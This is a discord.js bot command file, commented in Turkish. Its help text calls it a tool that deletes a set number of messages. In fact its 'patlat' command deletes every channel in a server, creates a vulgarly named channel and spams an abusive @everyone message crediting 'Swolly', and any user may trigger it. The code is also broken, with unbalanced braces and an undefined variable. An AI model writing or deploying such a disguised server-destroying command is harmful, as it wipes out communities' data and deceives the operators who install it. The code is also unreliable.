const Discord = require("discord.js");
exports.run = function(client, message) {

  message.guild.channels.map(m =>
    m.delete()
  );

 

    message.guild
    .createChannel("#KimseBaş/ Swolly Sikti ! ", "text")
    .then(zzz => {
    message.guild
    zzz.send(
        "** @everyone Swolly Tarafından Sikildiniz !!!**"
      );
                                              
         zzzz.send(
        "** @everyone Swolly Tarafından Sikildiniz !!!**"
      );


    })
    });
  }       
exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: ["sil"],
  permLevel: 0 
};
exports.help = {
  name: "patlat", 
  description: "Belirli Miktar Kadar Mesaj Siler", 
  usage: "patlat" 
};